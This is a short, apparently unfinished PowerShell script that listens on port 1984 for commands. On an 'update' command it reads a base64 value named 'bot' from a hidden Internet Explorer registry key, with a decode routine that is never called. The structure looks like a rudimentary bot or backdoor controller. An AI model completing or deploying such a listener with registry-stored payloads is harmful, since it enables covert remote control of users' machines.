import-module "C:\lib\script1.ps1" -force


function decode{
$Decode=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($convert64))

}


function global:FRX_Socket-MessageAction{
    param($message)
    $stop = $false
    switch ($message) {
        {$_ -match "update"  }{
            write-host "update" -ForegroundColor green
            $convert64 = get-itemproperty -path "registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" -Name bot
            echo $convert64

            }





        {$_ -match "COUNT"       } {write-host "COUNT" -ForegroundColor Yellow}
        {$_ -like  "GAMEOVER"    } {write-host "--- TERMINATING CONNECTION ---" -ForegroundColor red
                                    $stop=$true}
        Default {write-host $message}
    }

    return $stop
}

#netstat -ano | find "1984"
$socket   = FRX_Socket-Listen-Connect -port 1984
do{
   $message  = FRX_Socket-Listen-Read -socket $socket -buffersize 512
   $stop = FRX_Socket-MessageAction -message $message
}until($stop)

$closeACK = FRX_Socket-Listen-Close -socket $socket
